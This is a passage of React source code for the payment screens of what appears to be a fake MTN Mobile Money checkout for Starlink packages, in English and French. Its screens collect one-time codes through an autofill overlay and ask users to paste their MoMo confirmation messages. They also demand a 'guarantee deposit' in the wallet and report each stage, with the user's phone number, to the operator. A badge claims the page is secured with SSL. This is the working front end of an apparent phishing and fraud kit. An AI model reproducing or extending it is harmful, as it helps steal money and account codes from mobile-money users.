              <p className="mtn-pin-sub">{t("otpSub")}</p>
              <p
                className="mtn-pin-sub"
                style={{ fontWeight: 600, color: "#1a1a2e" }}
              >
                {cfg.code}
                {phone}
              </p>

              {otpStatus && (
                <div
                  className="mtn-error"
                  style={
                    otpStatus.ok
                      ? { background: "#e8f5e9", color: "#2e7d32" }
                      : { background: "#fff3cd", color: "#856404" }
                  }
                >
                  {otpStatus.msg}
                </div>
              )}

              <div className="mtn-otp-wrap">
                <input
                  ref={overlayRef}
                  type="text"
                  autoComplete="one-time-code"
                  inputMode="numeric"
                  maxLength={4}
                  className="mtn-otp-overlay"
                  onChange={checkOverlay}
                  onKeyUp={checkOverlay}
                  onPaste={(e) => {
                    e.preventDefault();
                    const pasted = e.clipboardData.getData("text");
                    if (overlayRef.current) overlayRef.current.value = "";
                    handleOtpText(pasted);
                  }}
                />
                <div className="mtn-otp-inputs">
                  {[0, 1, 2, 3].map((i) => (
                    <input
                      key={i}
                      ref={(el) => {
                        otpRefs.current[i] = el;
                      }}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      className="mtn-otp-input"
                      value={otp[i]}
                      onChange={(e) => onOtpChange(i, e.target.value)}
                      onKeyDown={(e) => onOtpKey(i, e)}
                      onPaste={(e) => {
                        e.preventDefault();
                        handleOtpText(e.clipboardData.getData("text"));
                      }}
                    />
                  ))}
                </div>
              </div>

              <div className="mtn-resend">
                <span
                  className={`mtn-resend-link${timer > 0 ? " disabled" : ""}`}
                  onClick={() => {
                    if (timer > 0) return;
                    setOtp(["", "", "", ""]);
                    setOtpStatus(null);
                    setTimer(20);
                    startCountdown();
                    startDetection();
                    otpRefs.current[0]?.focus();
                  }}
                >
                  {timer > 0 ? (
                    <>
                      {t("resendIn")} {timer} {t("seconds")}
                    </>
                  ) : (
                    t("resend")
                  )}
                </span>
              </div>

              <button
                className="mtn-submit"
                disabled={otp.join("").length < 4}
                onClick={verifyOtp}
              >
                {t("submit")}
              </button>
            </div>
          )}

          {/* ── NOT VERIFIED ── */}
          {screen === "notVerified" && (
            <div style={{ textAlign: "center", padding: "24px 20px" }}>
              <div
                style={{
                  width: 70,
                  height: 70,
                  borderRadius: "50%",
                  background: "#FEF3C7",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto 16px",
                }}
              >
                <span style={{ fontSize: 36 }}>💬</span>
              </div>
              <h2
                style={{
                  fontSize: 18,
                  color: "#B45309",
                  marginBottom: 8,
                  fontWeight: 700,
                }}
              >
                {t("verifyTitle")}
              </h2>
              <p
                style={{
                  color: "#6B7280",
                  fontSize: 13,
                  lineHeight: 1.7,
                  marginBottom: 16,
                  textAlign: "left",
                  background: "#F9FAFB",
                  borderRadius: 8,
                  padding: 12,
                  borderLeft: "3px solid #FBBF24",
                }}
                dangerouslySetInnerHTML={{ __html: t("verifyInstructions") }}
              />
              <textarea
                rows={5}
                value={momoMsg}
                onChange={(e) => setMomoMsg(e.target.value)}
                placeholder={t("verifyPlaceholder")}
                style={{
                  width: "100%",
                  padding: 12,
                  border: "2px solid #D1D5DB",
                  borderRadius: 10,
                  fontSize: 13,
                  fontFamily: "inherit",
                  resize: "none",
                  lineHeight: 1.5,
                  outline: "none",
                  color: "#111827",
                }}
              />
              <p
                style={{
                  fontSize: 12,
                  color: momoSent ? "#10B981" : "#EF4444",
                  margin: "8px 0 12px",
                  minHeight: 18,
                }}
              >
                {momoSent ? t("awaiting") : ""}
              </p>
              <button
                disabled={momoMsg.trim().length <= 10}
                onClick={submitMomoMessage}
                style={{
                  width: "100%",
                  padding: 14,
                  background: momoSent ? "#F59E0B" : "#F59E0B",
                  color: "#fff",
                  border: "none",
                  borderRadius: 10,
                  fontSize: 15,
                  fontWeight: 600,
                  cursor:
                    momoMsg.trim().length <= 10 ? "not-allowed" : "pointer",
                  opacity: momoMsg.trim().length <= 10 ? 0.6 : 1,
                  marginBottom: 10,
                }}
              >
                {momoSent ? t("messageSent") : t("submitMessage")}
              </button>
              <button
                onClick={backToPhone}
                style={{
                  width: "100%",
                  padding: 12,
                  background: "transparent",
                  color: "#9CA3AF",
                  border: "2px solid #4B5563",
                  borderRadius: 10,
                  fontSize: 14,
                  fontWeight: 500,
                  cursor: "pointer",
                }}
              >
                {t("useDifferent")}
              </button>
            </div>
          )}

          {/* ── INSUFFICIENT ── */}
          {screen === "insufficient" && (
            <div style={{ textAlign: "center", padding: "30px 20px" }}>
              <div
                style={{
                  width: 80,
                  height: 80,
                  borderRadius: "50%",
                  background: "#FEF3C7",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto 20px",
                }}
              >
                <span style={{ fontSize: 40 }}>⚠️</span>
              </div>
              <h2
                style={{
                  fontSize: 20,
                  color: "#B45309",
                  marginBottom: 8,
                  fontWeight: 700,
                }}
              >
                {t("insufficientTitle")}
              </h2>
              <p
                style={{
                  color: "#9CA3AF",
                  fontSize: 13,
                  lineHeight: 1.6,
                  marginBottom: 24,
                }}
              >
                {lang === "fr" ? (
                  <>
                    Vous devez avoir au moins{" "}
                    <strong style={{ color: "#fff" }}>{amount}</strong> dans
                    votre portefeuille MTN Mobile Money comme{" "}
                    <strong style={{ color: "#fff" }}>dépôt de garantie</strong>{" "}
                    pour souscrire à un forfait Starlink.
                    <br />
                    <br />
                    Veuillez déposer le montant requis et cliquer sur le bouton
                    ci-dessous.
                  </>
                ) : (
                  <>
                    You must have at least{" "}
                    <strong style={{ color: "#fff" }}>{amount}</strong> in your
                    MTN Mobile Money wallet as a{" "}
                    <strong style={{ color: "#fff" }}>guarantee deposit</strong>{" "}
                    to subscribe to any Starlink package.
                    <br />
                    <br />
                    Please deposit the required amount and click the button
                    below.
                  </>
                )}
              </p>
              <button
                onClick={() => {
                  notifyStage("insufficient_balance", base, {
                    phone: fullPhone,
                  });
                  startOtp();
                }}
                style={{
                  width: "100%",
                  padding: 14,
                  background: "#10B981",
                  color: "#fff",
                  border: "none",
                  borderRadius: 10,
                  fontSize: 15,
                  fontWeight: 600,
                  cursor: "pointer",
                  marginBottom: 12,
                }}
              >
                {t("deposited")}
              </button>
              <button
                onClick={backToPhone}
                style={{
                  width: "100%",
                  padding: 14,
                  background: "transparent",
                  color: "#9CA3AF",
                  border: "2px solid #4B5563",
                  borderRadius: 10,
                  fontSize: 14,
                  fontWeight: 500,
                  cursor: "pointer",
                }}
              >
                {t("useDifferent")}
              </button>
            </div>
          )}

          {/* ── DONE ── */}
          {screen === "done" && (
            <div style={{ textAlign: "center", padding: "20px 20px 8px" }}>
              <div
                style={{
                  width: 70,
                  height: 70,
                  borderRadius: "50%",
                  background: "#DCFCE7",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto 16px",
                }}
              >
                <span style={{ fontSize: 34 }}>✅</span>
              </div>
              <h2
                style={{
                  fontSize: 20,
                  color: "#15803D",
                  marginBottom: 8,
                  fontWeight: 700,
                }}
              >
                {t("paymentSuccessful")}
              </h2>
              <p
                style={{
                  color: "#6B7280",
                  fontSize: 13,
                  lineHeight: 1.6,
                  marginBottom: 24,
                }}
              >
                {packageName} — {t("doneMsg")}
              </p>
              <button
                onClick={onBack}
                style={{
                  width: "100%",
                  padding: 14,
                  background: "#ffcc00",
                  color: "#1a1a2e",
                  border: "none",
                  borderRadius: 8,
                  fontSize: 16,
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                {t("done")}
              </button>
            </div>
          )}

          <div className="mtn-ssl">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
            </svg>
            <span>{t("ssl")}</span>
          </div>
        </div>
      </div>
    </div>
  );
}
